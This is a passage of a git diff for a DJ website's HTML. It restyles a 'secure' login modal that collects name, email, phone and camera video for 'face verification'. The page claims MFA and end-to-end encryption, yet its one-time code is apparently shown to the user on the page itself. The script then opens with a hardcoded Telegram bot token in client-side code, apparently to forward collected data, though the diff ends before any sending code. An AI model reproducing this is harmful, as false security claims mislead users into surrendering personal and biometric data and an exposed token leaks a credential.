@@ -2710,518 +2710,753 @@
 </script>
         
         <a href="mailto:maa.nirmala.dj.beltikri@gmail.com" class="side-link"><i class="fas fa-envelope"></i> Email</a>
-        <a href="javascript:void(0)" class="media-file-btn" onclick="openSecureHub()">
-    <div class="media-icon-wrapper">
-        <i class="fas fa-paperclip"></i>
+        
+    </div><a href="javascript:void(0)" class="mnd-simple-trigger" onclick="mndAuth.openModal()">
+    <div class="mnd-trigger-icon"><i class="fas fa-fingerprint"></i></div>
+    <div class="mnd-trigger-text">
+        <strong>Access Creators Hub</strong>
+        <span>Secure Identity Gateway</span>
     </div>
-    <div class="media-btn-text">
-        <span class="m-title">Access Secure Hub</span>
-        <span class="m-sub">Encrypted Multi-Factor Login</span>
-    </div>
-    <i class="fas fa-chevron-right media-arrow"></i>
+    <i class="fas fa-chevron-right mnd-trigger-arrow"></i>
 </a>
 
-<div id="mndPushNotif" class="mnd-push-hidden">
-    <div class="mnd-push-header">
-        <div style="display:flex; align-items:center; gap:8px;">
-            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="Logo">
-            <span>MND Security Alert</span>
-        </div>
-        <span class="mnd-push-close" onclick="closePushNotif()">×</span>
+<div id="mndToast" class="mnd-toast mnd-hidden" onclick="mndAuth.copyOTP()">
+    <div class="mnd-toast-icon"><img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" alt="MND Logo"></div>
+    <div class="mnd-toast-content">
+        <strong>Maa Nirmala DJ Security</strong>
+        <span class="mnd-toast-desc" id="toastDesc">Your verification code is ready. Tap to copy.</span>
     </div>
-    <div class="mnd-push-body">
-        Maa Nirmala DJ Security:<br>
-        Your secure login code has been generated. Tap to copy.
-    </div>
-    <div class="mnd-push-otp" id="mndPushOtpText" onclick="copyPushOTP()" title="Tap to Copy">******</div>
-    <div class="mnd-push-footer">Swipe left or right to dismiss</div>
+    <div class="mnd-toast-code" id="toastCode">******</div>
 </div>
 
-<div id="hubAuthModal" class="hub-modal-overlay" style="display:none;">
-    <div class="hub-modal-box">
+<div id="mndAuthModal" class="mnd-modal-overlay">
+    <div class="mnd-modal-fullscreen">
         
-        <div class="hub-header">
-            <span class="hub-close-btn" onclick="closeHubModal()">×</span>
-            <div class="hub-static-ring">
-                <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="hub-logo">
-            </div>
-            <h2><i class="fas fa-shield-alt"></i> MFA SECURE LOGIN</h2>
+        <div class="mnd-modal-header">
+            <div class="mnd-drag-indicator"></div>
+            <button class="mnd-close-btn" onclick="mndAuth.abortProcess()"><i class="fas fa-times"></i></button>
+            <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="mnd-header-logo">
+            <h2 class="mnd-header-title">MFA VERIFICATION</h2>
+            <p class="mnd-header-sub">End-to-End Encrypted</p>
         </div>
 
-        <div class="hub-body">
+        <div class="mnd-scroll-body">
             
-            <div id="hubStep1">
-                <p class="hub-instruction">Enter your identity matrix to proceed.</p>
+            <div id="step1" class="mnd-step active">
+                <p class="mnd-instruction">Enter your details to initiate a secure session.</p>
                 
-                <div class="input-group">
+                <div class="mnd-input-wrap">
                     <i class="fas fa-user"></i>
-                    <input type="text" id="hubName" autocomplete="name" placeholder="Full Legal Name">
+                    <input type="text" id="inpName" class="mnd-input" placeholder="Full Legal Name" autocomplete="name">
                 </div>
-                
-                <div class="input-group">
+                <div class="mnd-input-wrap">
                     <i class="fas fa-envelope"></i>
-                    <input type="email" id="hubEmail" autocomplete="email" placeholder="Email Address (Optional)">
+                    <input type="email" id="inpEmail" class="mnd-input" placeholder="Email Address" autocomplete="email">
                 </div>
-
-                <div class="input-group">
+                <div class="mnd-input-wrap">
                     <i class="fas fa-phone"></i>
-                    <input type="tel" id="hubPhone" autocomplete="tel" placeholder="10-Digit Mobile Number" maxlength="10">
+                    <input type="tel" id="inpPhone" class="mnd-input" placeholder="10-Digit Mobile" maxlength="10" autocomplete="tel">
                 </div>
 
-                <div class="mfa-divider"><span>SELECT AUTH METHOD</span></div>
-                
-                <button class="mfa-btn btn-face" onclick="startFaceScanning()">
-                    <i class="fas fa-expand"></i> AI FACE RECOGNITION
-                </button>
-                
-                <button class="mfa-btn btn-lock" onclick="startDeviceLockAuth()">
-                    <i class="fas fa-fingerprint"></i> DEVICE BIOMETRICS / PIN
-                </button>
+                <div class="mnd-divider"><span>SELECT LOGIN METHOD</span></div>
 
-                <button class="mfa-btn btn-otp" id="btnStandardOtp" onclick="generateStandardOTP()">
-                    <i class="fas fa-comment-sms"></i> STANDARD SMS OTP
+                <button class="mnd-btn btn-gold" onclick="mndFace.startScan()">
+                    <i class="fas fa-camera"></i> Face Verification
+                </button>
+                <button class="mnd-btn btn-dark" onclick="mndSecurity.startBiometric()">
+                    <i class="fas fa-fingerprint"></i> Device Lock / Fingerprint
+                </button>
+                <button class="mnd-btn btn-outline" id="btnSms" onclick="mndAuth.generateOTP('Standard SMS')">
+                    <i class="fas fa-comment-sms"></i> Login with OTP
                 </button>
             </div>
 
-            <div id="hubStepFaceID" style="display:none; flex-direction:column; align-items:center;">
-                <p class="hub-instruction" id="faceInstruction" style="font-weight:bold;">Position your face within the frame.</p>
+            <div id="step2" class="mnd-step">
+                <h3 class="mnd-step-title">HUMAN VERIFICATION</h3>
                 
-                <div class="scanner-container">
-                    <video id="hubVideo" autoplay playsinline></video>
-                    <div class="scan-corners"></div>
-                    <div class="scan-laser" id="scanLaser"></div>
-                    <div class="scan-overlay-img"></div>
+                <div class="mnd-kyc-hints" id="kycHints">
+                    <i class="fas fa-info-circle"></i> <span id="kycHintText">Look straight into the camera</span>
                 </div>
                 
-                <canvas id="hubCanvas" style="display:none;"></canvas>
+                <div class="mnd-kyc-container" id="kycBox">
+                    <video id="kycVideo" autoplay muted playsinline></video>
+                    <div class="mnd-kyc-ring"></div>
+                </div>
                 
-                <button id="hubCaptureBtn" class="mfa-btn btn-face" onclick="executeFaceAnalysis()">
-                    <i class="fas fa-crosshairs"></i> INITIATE NEURAL SCAN
+                <div class="mnd-camera-controls">
+                    <button class="mnd-cam-btn" onclick="mndFace.toggleCamera()" title="Switch Front/Rear">
+                        <i class="fas fa-sync-alt"></i> Flip
+                    </button>
+                    <button class="mnd-cam-btn" id="btnFlash" onclick="mndFace.toggleFlashlight()" style="display:none;" title="Flashlight">
+                        <i class="fas fa-bolt"></i> Flash
+                    </button>
+                </div>
+
+                <p class="mnd-kyc-status" id="kycStatus">AWAITING CAMERA...</p>
+                <canvas id="kycCanvas" style="display:none;"></canvas>
+
+                <button class="mnd-btn btn-gold" id="btnStartScan" onclick="mndFace.runAnalysis()">
+                    <i class="fas fa-expand"></i> START SCANNING
                 </button>
-                <p class="hub-back-link" onclick="resetToMethods()">Cancel & Change Method</p>
+                <button class="mnd-btn btn-danger" onclick="mndAuth.abortProcess()">
+                    <i class="fas fa-times-circle"></i> CANCEL & GO BACK
+                </button>
             </div>
 
-            <div id="hubStep2" style="display:none;">
-                <p style="color:#00fa9a; font-size:14px; text-align:center; margin-bottom:15px; font-weight:bold;">
-                    <i class="fas fa-shield-check"></i> Security Code Dispatched
-                </p>
-                <input type="tel" id="hubOtpInput" autocomplete="one-time-code" class="otp-input-box" placeholder="******" maxlength="6">
+            <div id="step3" class="mnd-step">
+                <i class="fas fa-shield-check mnd-success-icon"></i>
+                <h3 class="mnd-step-title" style="color: var(--success);">SECURITY CODE SENT</h3>
+                <p class="mnd-instruction">Enter the 6-digit code below. Valid for 5 minutes.</p>
+
+                <div class="mnd-otp-center-wrap">
+                    <input type="tel" id="inpOTP" class="mnd-otp-input" placeholder="------" maxlength="6" autocomplete="one-time-code">
+                </div>
                 
-                <button class="mfa-btn btn-verify" onclick="verifyHubOTP()">
-                    <i class="fas fa-unlock"></i> DECRYPT & ENTER
+                <p id="otpErrorMsg" class="mnd-error-text"></p>
+
+                <button class="mnd-btn btn-success" onclick="mndAuth.verifyOTP()">
+                    <i class="fas fa-unlock"></i> AUTHORIZE SESSION
                 </button>
-                <p class="hub-back-link" onclick="resetToMethods()">Abort Login</p>
+                
+                <div class="mnd-btn-row">
+                    <button class="mnd-btn btn-dark half-btn" id="btnResend" onclick="mndAuth.resendOTP()">
+                        <i class="fas fa-redo"></i> RESEND <span id="resendTimer"></span>
+                    </button>
+                    <button class="mnd-btn btn-danger half-btn" onclick="mndAuth.abortProcess()">
+                        <i class="fas fa-arrow-left"></i> BACK
+                    </button>
+                </div>
             </div>
+
         </div>
     </div>
 </div>
 
-<div id="seamlessHubLoader" style="display:none; position:fixed; inset:0; background:#050505; z-index:999999999; flex-direction:column; justify-content:center; align-items:center;">
-    <div class="loader-rings"></div>
-    <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="loader-logo">
-    <h2 class="loader-title">MAA NIRMALA HUB</h2>
-    <p id="hubLoadText" class="loader-text">Establishing Secure Handshake...</p>
-</div>
+<div id="fullLoader" class="mnd-loader">
+    <div class="mnd-loader-content">
+        <div class="mnd-loader-pulse"></div>
+        <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" class="loader-profile-logo" alt="Profile">
+    </div>
+    <div class="loader-text" id="loaderText">Initializing Secure Connection...</div>
+    <div class="loader-progress-bar"><div class="loader-progress-fill" id="loaderFill"></div></div>
+    <style>
+    /* --- 1. GLOBAL VARIABLES & RESET --- */
+    :root {
+        --primary: #D4AF37;
+        --success: #00fa9a;
+        --danger: #ff4444;
+        --bg-main: #050505;
+        --bg-panel: #111111;
+        --bg-input: #1a1a1a;
+        --border-deep: rgba(255, 255, 255, 0.12);
+        --text-main: #ffffff;
+        --text-muted: #888888;
+        --font-main: 'Outfit', sans-serif;
+        --ease: 0.4s cubic-bezier(0.2, 0.8, 0.2, 1);
+    }
 
-<style>
-    /* Media Button Trigger Styles */
-    .media-file-btn {
-        display: flex; align-items: center; justify-content: space-between;
-        background: rgba(20, 20, 20, 0.6); border: 1px solid rgba(212, 175, 55, 0.3);
-        border-radius: 12px; padding: 12px 16px; width: 100%; text-decoration: none;
-        box-sizing: border-box; transition: all 0.3s ease; margin-bottom: 20px;
-        backdrop-filter: blur(5px);
-    }
-    .media-file-btn:active { transform: scale(0.98); border-color: #D4AF37; background: rgba(212, 175, 55, 0.1); }
-    .media-icon-wrapper { width: 40px; height: 40px; border-radius: 50%; background: rgba(212, 175, 55, 0.1); display: flex; justify-content: center; align-items: center; color: #D4AF37; font-size: 18px; }
-    .media-btn-text { flex: 1; margin-left: 15px; display: flex; flex-direction: column; }
-    .m-title { color: #fff; font-family: 'Outfit', sans-serif; font-size: 15px; font-weight: 700; }
-    .m-sub { color: #888; font-family: 'Outfit', sans-serif; font-size: 12px; }
-    .media-arrow { color: #555; font-size: 14px; }
+    * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+    body { background-color: var(--bg-main); color: var(--text-main); font-family: var(--font-main); overflow-x: hidden; }
 
-    /* Modal Full Screen Styles */
-    .hub-modal-overlay {
-        position: fixed; inset: 0; background: #050505; z-index: 9999999; display: flex; justify-content: center; align-items: flex-start;
+    /* --- 2. MAIN TRIGGER BUTTON --- */
+    .mnd-simple-trigger {
+        display: flex; align-items: center; gap: 15px; 
+        background: var(--bg-panel); border: 1px solid var(--border-deep);
+        border-radius: 16px; padding: 16px 20px; width: 90%; max-width: 400px;
+        margin: 30px auto; cursor: pointer; transition: var(--ease); text-decoration: none;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.5);
     }
-    .hub-modal-box {
-        background: linear-gradient(180deg, #111 0%, #050505 100%); width: 100vw; height: 100dvh; max-width: 100%; 
-        border-radius: 0; border: none; overflow-y: auto; position: relative; font-family: 'Outfit', sans-serif;
-        display: flex; flex-direction: column;
+    .mnd-simple-trigger:active { transform: scale(0.96); border-color: var(--primary); }
+    .mnd-trigger-icon { width: 45px; height: 45px; background: rgba(212, 175, 55, 0.1); color: var(--primary); border-radius: 12px; display: flex; justify-content: center; align-items: center; font-size: 20px; }
+    .mnd-trigger-text { flex: 1; display: flex; flex-direction: column; }
+    .mnd-trigger-text strong { font-size: 16px; font-weight: 800; color: #fff; }
+    .mnd-trigger-text span { font-size: 12px; color: var(--text-muted); margin-top: 2px; }
+    .mnd-trigger-arrow { color: var(--primary); font-size: 16px; opacity: 0.8; }
+
+    /* --- 3. ANDROID-STYLE TOAST NOTIFICATION --- */
+    .mnd-toast { 
+        position: fixed; top: -100px; left: 50%; transform: translateX(-50%); 
+        width: 90%; max-width: 340px; background: rgba(20, 20, 20, 0.98); 
+        backdrop-filter: blur(15px); border: 1px solid var(--border-deep); 
+        border-radius: 14px; padding: 12px 15px; z-index: 999999; 
+        display: flex; align-items: center; gap: 12px; box-shadow: 0 15px 30px rgba(0,0,0,0.9);
+        transition: top 0.5s var(--ease), opacity 0.3s; opacity: 0; cursor: pointer;
     }
-    .hub-header { padding: 40px 20px 20px; text-align: center; border-bottom: 1px solid rgba(212, 175, 55, 0.1); position: relative; }
-    .hub-close-btn { position: absolute; top: 20px; right: 25px; color: #888; font-size: 32px; cursor: pointer; transition: 0.3s; }
-    .hub-close-btn:hover { color: #ff3333; }
+    .mnd-toast.visible { top: 20px; opacity: 1; }
+    .mnd-toast-icon { width: 35px; height: 35px; border-radius: 8px; border: 2px solid var(--primary); padding: 2px; }
+    .mnd-toast-icon img { width: 100%; height: 100%; border-radius: 4px; object-fit: cover; }
+    .mnd-toast-content { flex: 1; display: flex; flex-direction: column; }
+    .mnd-toast-content strong { color: #fff; font-size: 13px; margin-bottom: 2px; letter-spacing: 0.5px; }
+    .mnd-toast-desc { color: #aaa; font-size: 11px; }
+    .mnd-toast-code { font-size: 18px; font-weight: 900; color: var(--primary); letter-spacing: 2px; background: rgba(212,175,55,0.1); padding: 5px 10px; border-radius: 8px; }
+
+    /* --- 4. FULL SCREEN MODAL & LAYOUT --- */
+    .mnd-modal-overlay {
+        position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 99999;
+        display: flex; justify-content: center; align-items: flex-end; opacity: 0; 
+        transition: opacity 0.3s ease; pointer-events: none;
+    }
+    .mnd-modal-overlay.active { opacity: 1; pointer-events: all; }
     
-    /* Static Logo (No Animation) */
-    .hub-static-ring {
-        width: 80px; height: 80px; margin: 0 auto 15px; border-radius: 50%;
-        padding: 3px; background: #D4AF37; box-shadow: 0 0 20px rgba(212, 175, 55, 0.3);
+    .mnd-modal-fullscreen {
+        background: var(--bg-main); width: 100%; max-width: 500px; height: 95dvh;
+        display: flex; flex-direction: column; position: relative;
+        border-top-left-radius: 24px; border-top-right-radius: 24px; border-top: 1px solid var(--border-deep);
+        transform: translateY(100%); transition: transform 0.5s var(--ease);
     }
-    .hub-logo { width: 100%; height: 100%; border-radius: 50%; border: 2px solid #000; object-fit: cover; }
-    .hub-header h2 { margin: 0; color: #D4AF37; font-family: 'Cinzel', serif; font-size: 24px; font-weight: 900; letter-spacing: 1px; }
+    .mnd-modal-overlay.active .mnd-modal-fullscreen { transform: translateY(0); }
 
-    /* Inputs Centered */
-    .hub-body { padding: 25px; flex: 1; display: flex; flex-direction: column; max-width: 500px; margin: 0 auto; width: 100%; box-sizing: border-box; }
-    .hub-instruction { color: #aaa; font-size: 14px; text-align: center; margin-bottom: 20px; }
-    .input-group { position: relative; margin-bottom: 15px; }
-    .input-group i { position: absolute; left: 15px; top: 16px; color: #D4AF37; opacity: 0.7; }
-    .input-group input {
-        width: 100%; padding: 15px 15px 15px 45px; background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px; font-family: 'Outfit'; font-size: 16px; box-sizing: border-box; transition: 0.3s;
+    /* Fixed Header */
+    .mnd-modal-header {
+        flex-shrink: 0; padding: 20px 20px 15px; text-align: center; border-bottom: 1px solid var(--border-deep);
+        background: var(--bg-panel); border-top-left-radius: 24px; border-top-right-radius: 24px;
+        position: relative; display: flex; flex-direction: column; align-items: center;
     }
-    .input-group input:focus { border-color: #D4AF37; outline: none; background: rgba(212,175,55,0.05); }
+    .mnd-drag-indicator { width: 40px; height: 4px; background: rgba(255,255,255,0.2); border-radius: 4px; margin-bottom: 15px; }
+    .mnd-close-btn { position: absolute; top: 20px; right: 20px; width: 32px; height: 32px; border-radius: 50%; background: var(--bg-input); color: var(--text-muted); display: flex; justify-content: center; align-items: center; font-size: 14px; cursor: pointer; border: 1px solid var(--border-deep); transition: 0.2s; }
+    .mnd-close-btn:active { transform: scale(0.9); background: rgba(255,68,68,0.2); color: var(--danger); }
+    .mnd-header-logo { width: 55px; height: 55px; border-radius: 50%; border: 2px solid var(--primary); margin-bottom: 10px; object-fit: cover; }
+    .mnd-header-title { font-size: 18px; font-weight: 900; letter-spacing: 1px; color: #fff; }
+    .mnd-header-sub { font-size: 10px; color: var(--success); font-weight: 700; letter-spacing: 2px; text-transform: uppercase; margin-top: 4px; }
+
+    /* Scrollable Content */
+    .mnd-scroll-body { flex: 1; overflow-y: auto; padding: 25px 20px; -webkit-overflow-scrolling: touch; }
+    .mnd-step { display: none; flex-direction: column; animation: slideFadeIn 0.4s var(--ease) forwards; max-width: 400px; margin: 0 auto; width: 100%; }
+    .mnd-step.active { display: flex; }
+    .mnd-instruction { text-align: center; color: var(--text-muted); font-size: 13px; margin-bottom: 25px; line-height: 1.5; }
+
+    /* --- 5. INPUTS & BUTTONS --- */
+    .mnd-input-wrap { position: relative; margin-bottom: 15px; }
+    .mnd-input-wrap i { position: absolute; left: 18px; top: 18px; color: var(--primary); font-size: 15px; opacity: 0.8; }
+    .mnd-input {
+        width: 100%; padding: 16px 16px 16px 50px; background: var(--bg-input);
+        border: 1px solid var(--border-deep); border-radius: 12px; color: #fff;
+        font-family: var(--font-main); font-size: 15px; font-weight: 500;
+        transition: 0.3s ease; outline: none; -webkit-appearance: none;
+    }
+    .mnd-input:focus { border-color: var(--primary); background: rgba(212,175,55,0.05); box-shadow: inset 0 0 10px rgba(0,0,0,0.5); }
     
-    .mfa-divider { text-align: center; margin: 25px 0; position: relative; }
-    .mfa-divider::before { content: ""; position: absolute; left: 0; top: 50%; width: 100%; height: 1px; background: rgba(255,255,255,0.1); }
-    .mfa-divider span { position: relative; background: #050505; padding: 0 10px; color: #666; font-size: 12px; font-weight: bold; letter-spacing: 1px; }
+    .mnd-divider { display: flex; align-items: center; margin: 25px 0; }
+    .mnd-divider::before, .mnd-divider::after { content: ''; flex: 1; height: 1px; background: var(--border-deep); }
+    .mnd-divider span { padding: 0 15px; font-size: 11px; font-weight: 800; color: #666; letter-spacing: 1.5px; text-transform: uppercase; }
 
-    /* Buttons */
-    .mfa-btn {
-        width: 100%; padding: 16px; margin-bottom: 15px; border-radius: 10px; font-family: 'Outfit'; font-weight: 800; font-size: 15px; cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 10px; transition: 0.3s; border: none;
+    .mnd-btn {
+        width: 100%; padding: 16px; border-radius: 12px; font-family: var(--font-main);
+        font-weight: 800; font-size: 14px; border: none; cursor: pointer; letter-spacing: 0.5px;
+        display: flex; justify-content: center; align-items: center; gap: 10px;
+        transition: transform 0.2s, background 0.3s; margin-bottom: 12px;
     }
-    .btn-face { background: linear-gradient(90deg, #D4AF37, #F3E5AB); color: #000; box-shadow: 0 5px 15px rgba(212,175,55,0.3); }
-    .btn-lock { background: #1a1a1a; border: 1px solid rgba(255,255,255,0.2); color: #fff; }
-    .btn-lock:hover { border-color: #D4AF37; color: #D4AF37; }
-    .btn-otp { background: transparent; border: 1px dashed rgba(212,175,55,0.5); color: #D4AF37; }
-    .btn-verify { background: #00fa9a; color: #000; font-size: 18px; letter-spacing: 1px; box-shadow: 0 5px 15px rgba(0,250,154,0.3); }
+    .mnd-btn:active { transform: scale(0.97); }
+    
+    .btn-gold { background: var(--primary); color: #000; box-shadow: 0 5px 15px rgba(212,175,55,0.2); }
+    .btn-dark { background: var(--bg-input); border: 1px solid var(--border-deep); color: #fff; }
+    .btn-dark i { color: var(--primary); }
+    .btn-outline { background: transparent; border: 1px dashed rgba(255,255,255,0.2); color: #aaa; }
+    .btn-success { background: var(--success); color: #000; box-shadow: 0 5px 15px rgba(0,250,154,0.2); margin-top: 10px; }
+    .btn-danger { background: rgba(255,68,68,0.1); border: 1px solid rgba(255,68,68,0.3); color: var(--danger); margin-top: 5px; }
 
-    /* Face Scanner UI */
-    .scanner-container {
-        width: 250px; height: 300px; position: relative; border-radius: 20px; overflow: hidden; margin: 0 auto 25px; background: #000; box-shadow: 0 0 30px rgba(212,175,55,0.15);
+    .mnd-btn-row { display: flex; gap: 10px; margin-top: 5px; }
+    .half-btn { flex: 1; padding: 15px; font-size: 12px; margin-bottom: 0; }
+
+    /* --- 6. FACE VERIFICATION UI --- */
+    .mnd-step-title { text-align: center; font-size: 16px; font-weight: 800; color: #fff; margin-bottom: 5px; letter-spacing: 1px; }
+    
+    .mnd-kyc-hints { background: rgba(212, 175, 55, 0.1); border: 1px solid rgba(212, 175, 55, 0.3); color: var(--primary); padding: 10px; border-radius: 8px; font-size: 12px; text-align: center; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; gap: 8px; font-weight: 600; }
+    
+    .mnd-kyc-container {
+        width: 220px; height: 300px; margin: 10px auto 15px; position: relative;
+        border-radius: 110px; /* Perfect Oval */
+        overflow: hidden; border: 4px solid var(--bg-input);
+        background: #111; display: flex; justify-content: center; align-items: center;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.8);
     }
-    #hubVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); } 
-    .scan-corners {
-        position: absolute; inset: 10px; border: 2px solid transparent;
-        background: linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 0 0, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to bottom, #D4AF37 4px, transparent 4px) 100% 0, linear-gradient(to right, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 0 100%, linear-gradient(to left, #D4AF37 4px, transparent 4px) 100% 100%, linear-gradient(to top, #D4AF37 4px, transparent 4px) 100% 100%;
-        background-repeat: no-repeat; background-size: 30px 30px; pointer-events: none; z-index: 2;
+    #kycVideo { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+    .mnd-kyc-ring {
+        position: absolute; inset: -4px; border-radius: 110px;
+        border: 4px solid transparent; transition: 0.4s; z-index: 5; pointer-events: none;
     }
-    .scan-laser { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #00fa9a; box-shadow: 0 0 15px #00fa9a, 0 0 30px #00fa9a; z-index: 3; animation: scanMove 3s ease-in-out infinite; display: none; }
-    .scan-overlay-img { position: absolute; inset: 0; background: url('https://cdn-icons-png.flaticon.com/512/3256/3256799.png') center/60% no-repeat; opacity: 0.15; filter: invert(1); pointer-events: none; z-index: 1; }
-    .scanner-active .scan-laser { display: block; }
-    .scanner-active .scan-overlay-img { animation: pulseFace 1s infinite; opacity: 0.4; }
+    .scanner-active .mnd-kyc-ring { border-color: var(--primary); animation: pulseOval 1.5s infinite; }
+    .scanner-success .mnd-kyc-ring { border-color: var(--success); box-shadow: inset 0 0 30px rgba(0,250,154,0.5); }
+    .scanner-error .mnd-kyc-ring { border-color: var(--danger); box-shadow: inset 0 0 30px rgba(255,68,68,0.5); }
 
-    /* OTP Code Input */
-    .otp-input-box { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(0,0,0,0.5); border: 2px solid #D4AF37; color: #D4AF37; border-radius: 12px; font-family: 'Outfit'; text-align: center; font-size: 32px; letter-spacing: 12px; font-weight: 900; box-sizing: border-box; text-shadow: 0 0 10px rgba(212,175,55,0.5); }
-    .hub-back-link { color: #ff3333; font-size: 14px; text-align: center; margin-top: 20px; cursor: pointer; text-decoration: underline; opacity: 0.8; }
+    .mnd-camera-controls { display: flex; justify-content: center; gap: 15px; margin-bottom: 15px; }
+    .mnd-cam-btn { background: rgba(255,255,255,0.1); border: none; color: #fff; padding: 8px 15px; border-radius: 20px; font-size: 12px; cursor: pointer; display: flex; align-items: center; gap: 6px; }
+    
+    .mnd-kyc-status { font-size: 12px; font-weight: 800; text-align: center; margin-bottom: 20px; color: var(--text-muted); letter-spacing: 1px; }
 
-    /* Push Notification Styles */
-    #mndPushNotif { position: fixed; left: 50%; width: 92%; max-width: 400px; background: rgba(15, 15, 15, 0.95); backdrop-filter: blur(20px); border: 1px solid rgba(212, 175, 55, 0.4); border-radius: 16px; padding: 16px; z-index: 9999999999; box-shadow: 0 15px 40px rgba(0,0,0,0.9); display: flex; flex-direction: column; gap: 10px; transition: top 0.6s cubic-bezier(0.2, 1, 0.3, 1), transform 0.3s ease, opacity 0.3s ease; }
-    .mnd-push-hidden { top: -300px; opacity: 0; transform: translateX(-50%) scale(0.9); }
-    .mnd-push-visible { top: 25px; opacity: 1; transform: translateX(-50%) scale(1); }
-    .mnd-push-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); padding-bottom: 8px; }
-    .mnd-push-header img { width: 22px; height: 22px; border-radius: 6px; }
-    .mnd-push-header span { color: #fff; font-size: 13px; font-weight: 700; opacity: 0.9; }
-    .mnd-push-close { color: #fff; font-size: 24px; cursor: pointer; opacity: 0.4; }
-    .mnd-push-body { color: #ccc; font-size: 13px; line-height: 1.5; }
-    .mnd-push-otp { font-size: 38px; font-weight: 900; color: #D4AF37; text-align: center; letter-spacing: 8px; padding: 12px 0; background: rgba(212,175,55,0.08); border-radius: 10px; border: 1px dashed rgba(212,175,55,0.3); cursor: pointer; user-select: none; transition: 0.2s; }
-    .mnd-push-otp:active { transform: scale(0.96); background: rgba(212,175,55,0.2); }
-    .mnd-push-footer { text-align: center; color: #666; font-size: 11px; margin-top: 5px; }
+    /* --- 7. PERFECT CENTERED OTP INPUT --- */
+    .mnd-success-icon { font-size: 45px; color: var(--success); text-align: center; display: block; margin-bottom: 10px; }
+    .mnd-otp-center-wrap { display: flex; justify-content: center; margin-bottom: 5px; }
+    .mnd-otp-input {
+        width: 220px; padding: 15px 10px; background: var(--bg-input);
+        border: 2px solid var(--primary); border-radius: 12px; color: var(--primary);
+        font-family: var(--font-main); text-align: center; font-size: 28px;
+        letter-spacing: 10px; font-weight: 900; outline: none;
+        box-shadow: inset 0 0 15px rgba(0,0,0,0.8); -webkit-appearance: none;
+    }
+    .mnd-otp-input:focus { border-color: #fff; color: #fff; }
+    .mnd-error-text { color: var(--danger); font-size: 12px; text-align: center; height: 15px; margin-bottom: 15px; font-weight: 600; }
 
-    /* Loader */
-    .loader-rings { width: 100px; height: 100px; border-radius: 50%; border: 3px solid transparent; border-top-color: #D4AF37; border-bottom-color: #00fa9a; animation: rotateGlow 1.5s linear infinite; margin-bottom: 25px; }
-    .loader-logo { width: 60px; position: absolute; top: calc(50% - 65px); border-radius: 50%; }
-    .loader-title { color: #D4AF37; font-family: 'Cinzel'; font-size: 24px; letter-spacing: 3px; margin: 0; }
-    .loader-text { color: #aaa; font-size: 13px; margin-top: 12px; letter-spacing: 1px; animation: pulseFace 1.5s infinite; }
+    /* --- 8. CENTERED PROFILE LOADER --- */
+    .mnd-loader {
+        position: fixed; inset: 0; background: rgba(5,5,5,0.98); z-index: 999999;
+        display: none; flex-direction: column; justify-content: center; align-items: center;
+    }
+    .mnd-loader.active { display: flex; }
+    .mnd-loader-content { position: relative; width: 100px; height: 100px; margin-bottom: 30px; display: flex; justify-content: center; align-items: center; }
+    .loader-profile-logo { width: 80px; height: 80px; border-radius: 50%; border: 3px solid var(--primary); object-fit: cover; z-index: 2; }
+    .mnd-loader-pulse { position: absolute; inset: 0; border-radius: 50%; border: 2px solid var(--primary); animation: ripple 1.5s infinite ease-out; z-index: 1; }
+    .loader-text { color: var(--primary); font-size: 13px; font-weight: 800; letter-spacing: 2px; text-transform: uppercase; margin-bottom: 20px; animation: textBlink 1.5s infinite; }
+    .loader-progress-bar { width: 200px; height: 4px; background: rgba(255,255,255,0.1); border-radius: 4px; overflow: hidden; }
+    .loader-progress-fill { width: 0%; height: 100%; background: var(--success); transition: width 0.3s ease; }
 
-    @keyframes rotateGlow { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    @keyframes scanMove { 0%, 100% { top: 5%; opacity:0; } 10% { opacity:1; } 50% { top: 95%; } 90% { opacity:1; } }
-    @keyframes pulseFace { 0%, 100% { opacity: 0.2; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.05); } }
+    /* --- 9. ANIMATIONS --- */
+    @keyframes slideFadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+    @keyframes pulseOval { 0% { box-shadow: 0 0 0 0 rgba(212,175,55,0.3); } 70% { box-shadow: 0 0 0 15px rgba(212,175,55,0); } 100% { box-shadow: 0 0 0 0 rgba(212,175,55,0); } }
+    @keyframes ripple { 0% { transform: scale(0.8); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
+    @keyframes textBlink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
 </style>
-
-<script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
-<script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/blazeface"></script>
-
 <script>
-    // --- SYSTEM STATE ---
-    let hubOTP = "";
-    let uName = "", uPhone = "", uEmail = "";
-    let videoStream = null;
-    let pushTimer = null;
-    let authMethodChosen = "";
-    
-    // Telegram Configuration
-    const TG_BOT_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
